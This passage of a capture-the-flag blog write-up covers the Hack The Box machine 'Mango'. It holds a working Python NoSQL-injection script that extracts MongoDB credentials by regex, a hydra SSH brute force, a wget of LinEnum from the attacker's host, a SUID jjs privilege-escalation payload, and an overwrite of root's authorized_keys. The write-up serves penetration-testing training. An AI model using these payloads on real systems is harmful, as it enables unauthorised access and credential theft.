<span class="n">HEADERS</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
<span class="n">MAX_FIELD_LENGTH</span> <span class="o">=</span> <span class="mi">255</span>


<span class="k">def</span> <span class="nf">check_valid</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
	<span class="s">"""This function returns True if the request results in a successful login"""</span>
	<span class="k">return</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">HEADERS</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">).</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'location'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span> <span class="o">==</span> <span class="s">'home.php'</span>


<span class="k">def</span> <span class="nf">enumerate_usernames</span><span class="p">():</span>
	<span class="s">"""This function returns a list of usernames extracted"""</span>
	<span class="n">list_of_usernames</span> <span class="o">=</span> <span class="p">[]</span>

	<span class="n">valid_username_lengths</span> <span class="o">=</span> <span class="n">get_username_lengths</span><span class="p">()</span>

	<span class="k">for</span> <span class="n">user_len</span> <span class="ow">in</span> <span class="n">valid_username_lengths</span><span class="p">:</span>
		<span class="n">list_of_usernames</span> <span class="o">+=</span> <span class="n">get_usernames</span><span class="p">(</span><span class="n">user_len</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">list_of_usernames</span>


<span class="k">def</span> <span class="nf">get_username_lengths</span><span class="p">():</span>
	<span class="s">"""This function returns a list containing the various lengths of the usernames"""</span>
	<span class="n">test_username_length_format</span> <span class="o">=</span> <span class="s">"username[$regex]=^.{{{}}}$&amp;password[$ne]=something&amp;login=login"</span>
	<span class="n">valid_username_lengths</span> <span class="o">=</span> <span class="p">[]</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">FIELD_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="n">test_username_length_format</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[*] Testing for username length: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="k">if</span> <span class="n">check_valid</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
			<span class="c1"># print("[*] Username length found: {}".format(i))
</span>			<span class="n">valid_username_lengths</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">valid_username_lengths</span>


<span class="k">def</span> <span class="nf">get_usernames</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
	<span class="s">"""This function returns a list of usernames of the given length"""</span>
	<span class="n">usernames</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>
	<span class="n">test_username_format</span> <span class="o">=</span> <span class="s">"username[$regex]=^{}.*$&amp;password[$ne]=something&amp;login=login"</span>

	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
		<span class="n">username</span> <span class="o">=</span> <span class="s">""</span>
		<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
			<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">VALID_CHARS</span><span class="p">:</span>
				<span class="n">tmp</span> <span class="o">=</span> <span class="n">username</span> <span class="o">+</span> <span class="n">i</span>
				<span class="k">print</span> <span class="s">"[*] Testing for username: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
				<span class="n">payload</span> <span class="o">=</span> <span class="n">test_username_format</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
				<span class="k">if</span> <span class="n">check_valid</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
					<span class="n">username</span> <span class="o">=</span> <span class="n">tmp</span>
					<span class="k">break</span>

		<span class="k">if</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">username</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">usernames</span><span class="p">:</span>
			<span class="n">test_username_format</span> <span class="o">+=</span> <span class="s">"&amp;username[$ne]={}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
			<span class="n">usernames</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[*] Username found: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">))</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">break</span>

	<span class="k">return</span> <span class="nb">list</span><span class="p">(</span><span class="n">usernames</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">get_password_length</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
	<span class="s">"""This function returns the length of the password corresponding to the given username"""</span>
	<span class="n">test_password_length_format</span> <span class="o">=</span> <span class="s">"username={}&amp;password[$regex]=^.{{{}}}$&amp;login=login"</span>

	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">FIELD_LENGTH</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[*] Testing for password length: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
		<span class="n">payload</span> <span class="o">=</span> <span class="n">test_password_length_format</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">check_valid</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
			<span class="k">return</span> <span class="n">i</span>

<span class="k">def</span> <span class="nf">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
	<span class="s">"""This function returns the password corresponding to the given username"""</span>
	<span class="n">test_password_format</span> <span class="o">=</span> <span class="s">"username={}&amp;password[$regex]=^{}.*$&amp;login=login"</span>

	<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>

	<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">get_password_length</span><span class="p">(</span><span class="n">username</span><span class="p">)):</span>
		<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">VALID_CHARS</span><span class="p">:</span>
			<span class="n">tmp</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">i</span>
			<span class="k">print</span><span class="p">(</span><span class="s">"[*] Testing for password: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">tmp</span><span class="p">))</span>
			<span class="n">payload</span> <span class="o">=</span> <span class="n">test_password_format</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">quote_plus</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">escape</span><span class="p">(</span><span class="n">tmp</span><span class="p">)))</span>
			<span class="k">if</span> <span class="n">check_valid</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
				<span class="n">password</span> <span class="o">=</span> <span class="n">tmp</span>
				<span class="k">print</span><span class="p">(</span><span class="s">"[*] Password found: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
				<span class="k">break</span>

	<span class="k">return</span> <span class="n">password</span>



<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="s">"""This is the main function"""</span>
	<span class="n">user_list</span> <span class="o">=</span> <span class="n">enumerate_usernames</span><span class="p">()</span>
	<span class="k">for</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">user_list</span><span class="p">:</span>
		<span class="n">password</span> <span class="o">=</span> <span class="n">get_password</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"[*] Found {}:{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>

</pre></table></code></div></div><p>It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span><span class="k">*</span><span class="o">]</span> Found admin:t9KcS3&gt;!0B#2
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found mango:h3mXK8RhU~f<span class="o">{]</span>f5H
</pre></table></code></div></div><p>The web app doesn’t seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the <code class="language-plaintext highlighter-rouge">ssh</code> service!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>user.txt
admin
mango

<span class="nv">$ </span><span class="nb">cat </span>pass.txt
t9KcS3&gt;!0B#2
h3mXK8RhU~f<span class="o">{]</span>f5H

<span class="nv">$ </span>hydra <span class="nt">-L</span> user.txt <span class="nt">-P</span> pass.txt ssh://mango.htb
Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> 2019 by van Hauser/THC - Please <span class="k">do </span>not use <span class="k">in </span>military or secret service organizations, or <span class="k">for </span>illegal purposes.

Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2020-04-18 15:17:36
<span class="o">[</span>WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use <span class="nt">-t</span> 4
<span class="o">[</span>DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries <span class="o">(</span>l:2/p:2<span class="o">)</span>, ~1 try per task
<span class="o">[</span>DATA] attacking ssh://mango.htb:22/
<span class="o">[</span>22][ssh] host: mango.htb   login: mango   password: h3mXK8RhU~f<span class="o">{]</span>f5H
1 of 1 target successfully completed, 1 valid password found
Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2020-04-18 15:17:41
</pre></table></code></div></div><p>Using this set of credentials, we can <code class="language-plaintext highlighter-rouge">ssh</code> into the box:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh mango@mango.htb
mango@mango.htb<span class="s1">'s password:
mango@mango:~$ ls -al 
total 44
drwxr-xr-x 6 mango mango 4096 Apr 18 19:04 .
drwxr-xr-x 4 root  root  4096 Sep 27  2019 ..
lrwxrwxrwx 1 mango mango    9 Sep 27  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 mango mango  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mango mango 3771 Apr  4  2018 .bashrc
drwx------ 2 mango mango 4096 Sep 28  2019 .cache
-rw------- 1 mango mango   14 Apr 18 16:34 .dbshell
drwx------ 3 mango mango 4096 Apr 18 18:23 .gnupg
drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local
-rw------- 1 mango mango    0 Apr 18 16:34 .mongorc.js
-rw-r--r-- 1 mango mango  807 Apr  4  2018 .profile
drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh
-rw------- 1 mango mango  858 Apr 18 19:04 .viminfo
</span></pre></table></code></div></div><p>Where’s the <code class="language-plaintext highlighter-rouge">user.txt</code>? Lets see if there are any other possible users on the box.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>mango@mango:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /home
total 16
drwxr-xr-x  4 root  root  4096 Sep 27  2019 <span class="nb">.</span>
drwxr-xr-x 23 root  root  4096 Sep 27  2019 ..
drwxr-xr-x  4 admin admin 4096 Apr 18 19:26 admin
drwxr-xr-x  6 mango mango 4096 Apr 18 19:04 mango
</pre></table></code></div></div><p>Seems like <code class="language-plaintext highlighter-rouge">admin</code> has the <code class="language-plaintext highlighter-rouge">user.txt</code>!</p><h1 id="usertxt">user.txt</h1><p>Using <code class="language-plaintext highlighter-rouge">su</code> and the admin credentials we found in the web app database, we are able to login as <code class="language-plaintext highlighter-rouge">admin</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>mango@mango:~<span class="nv">$ </span>su admin
Password: 
<span class="nv">$ </span><span class="nb">whoami
</span>admin
</pre></table></code></div></div><p>Getting the flag was a piece of cake:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> ~/user.txt
79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h1 id="enumeration2">Enumeration(2)</h1><p>As usual, I will use <a href="https://github.com/rebootuser/LinEnum"><code class="language-plaintext highlighter-rouge">LinEnum</code></a> to enumerate for ways to escalate to <code class="language-plaintext highlighter-rouge">root</code>.</p><p>Spawning web server:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/LinEnum.sh <span class="nb">.</span>
<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80 
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</pre></table></code></div></div><p>Retrieving the script:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /tmp
<span class="nv">$ </span>wget http://10.10.XX.XX/LinEnum.sh
<span class="nt">--2020-04-18</span> 20:04:09--  http://10.10.XX.XX/LinEnum.sh
Connecting to 10.10.14.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46476 <span class="o">(</span>45K<span class="o">)</span> <span class="o">[</span>text/x-sh]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                     100%[<span class="o">====================================================================================================&gt;]</span>  45.39K  78.8KB/s    <span class="k">in </span>0.6s    

2020-04-18 20:04:10 <span class="o">(</span>78.8 KB/s<span class="o">)</span> - ‘LinEnum.sh’ saved <span class="o">[</span>46476/46476]
</pre></table></code></div></div><p>Running the script:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod</span> +x LinEnum.sh
<span class="nv">$ </span>./LinEnum.sh
...
<span class="o">[</span>+] Possibly interesting SUID files:
<span class="nt">-rwsr-sr--</span> 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
</pre></table></code></div></div><p>Alright, we can use this executable to escalate our privileges! With the <code class="language-plaintext highlighter-rouge">SUID</code> bit set on the file, we can execute <code class="language-plaintext highlighter-rouge">jjs</code> as if we are <code class="language-plaintext highlighter-rouge">root</code>.</p><p>According to <a href="https://gtfobins.github.io/gtfobins/jjs/"><code class="language-plaintext highlighter-rouge">GTFOBins</code></a>, we are able to spawn an interactive shell with elevated permissions:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /usr/lib/jvm/java-11-openjdk-amd64/bin/
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc </span><span class="se">\$</span><span class="s2">@|sh</span><span class="se">\$</span><span class="s2">{IFS}-p _ echo sh -p &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">').waitFor()"</span> | ./jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs&gt; Java.type<span class="o">(</span><span class="s1">'java.lang.Runtime'</span><span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s1">'/bin/sh -pc $@|sh${IFS}-p _ echo sh -p &lt;/dev/pts/0 &gt;/dev/pts/0 2&gt;/dev/pts/0'</span><span class="o">)</span>.waitFor<span class="o">()</span>
<span class="c"># </span>
</pre></table></code></div></div><p>Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell.</p><p>I tried to spawn a reverse shell back to my listener but it didn’t work. However, I realised that I was able to perform very simple commands like “cp” and “mv” but no piping or redirection.</p><p>So how about we write to <code class="language-plaintext highlighter-rouge">root</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file?</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># cat /etc/ssh/sshd_config</span>
...
PermitRootLogin <span class="nb">yes</span>
...
AllowUsers mango root
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>From the above config, we can confirm that we are able to <code class="language-plaintext highlighter-rouge">ssh</code> directly into the box as <code class="language-plaintext highlighter-rouge">root</code>. To do so, first we’ll need to generate a <code class="language-plaintext highlighter-rouge">SSH</code> keypair.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>ssh-keygen <span class="nt">-t</span> rsa
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/root/.ssh/id_rsa<span class="o">)</span>: 
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="k">in</span> /root/.ssh/id_rsa.
Your public key has been saved <span class="k">in</span> /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:TEPWxxvFEd9AoEM+xQGEYHHyVHuUeSugqKuFihcLCf4 root@kali
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
|      =o===+=O*o |
|     . B.oo=B oo.|
|       .+.*o.+ .o|
|.     .o.. +o .  |
|o.   .  S    .   |
|o....            |
| .oo..           |
|..oE.            |
|o...             |
+----[SHA256]-----+
</span></pre></table></code></div></div><p>Open the public key<code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa.pub</code> and copy the contents into your clipboard.</p><p>Echo it into a file in the <code class="language-plaintext highlighter-rouge">tmp</code> directory.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="c"># echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali" &gt; /tmp/secret</span>
</pre></table></code></div></div><p>And now overwrite the <code class="language-plaintext highlighter-rouge">root</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"Java.type('java.lang.Runtime').getRuntime().exec('cp /tmp/secret /root/.ssh/authorized_keys').waitFor()"</span> | ./jjs
</pre></table></code></div></div><p>Now, we are able to <code class="language-plaintext highlighter-rouge">ssh</code> into the <code class="language-plaintext highlighter-rouge">root</code> account using our private key <code class="language-plaintext highlighter-rouge">/root/id_rsa</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> /root/id_rsa root@mango.htb
...
root@mango:~# <span class="nb">cat </span>root.txt
8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/mongodb/" class="post-tag no-text-decoration" >mongodb</a> <a href="/tags/jjs/" class="post-tag no-text-decoration" >jjs</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Mango - rizemon's blog&url=https://rizemon.github.io/posts/mango-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Mango - rizemon's blog&u=https://rizemon.github.io/posts/mango-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Mango - rizemon's blog&url=https://rizemon.github.io/posts/mango-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-htb/"><div class="card-body"> <span class="timeago small" > Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Writeup</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! $ ech...</p></div></div></a></div><div class="card"> <a href="/posts/haystack-htb/"><div class="card-body"> <span class="timeago small" > Nov 3, 2019 <i class="unloaded">2019-11-03T18:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Haystack</h3><div class="text-muted small"><p> I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The opera...</p></div></div></a></div><div class="card"> <a href="/posts/postman-htb/"><div class="card-body"> <span class="timeago small" > Mar 15, 2020 <i class="unloaded">2020-03-15T11:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Postman</h3><div class="text-muted small"><p> Despite the name of this box, it was nowhere related to Postman! This box was quite weird as I actually jumped straight to root instead of going to user first. Configuration The operating syste...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/traverxec-htb/" class="btn btn-outline-primary"><p>Hack The Box - Traverxec</p></a> <a href="/posts/openadmin-htb/" class="btn btn-outline-primary"><p>Hack The Box - OpenAdmin</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 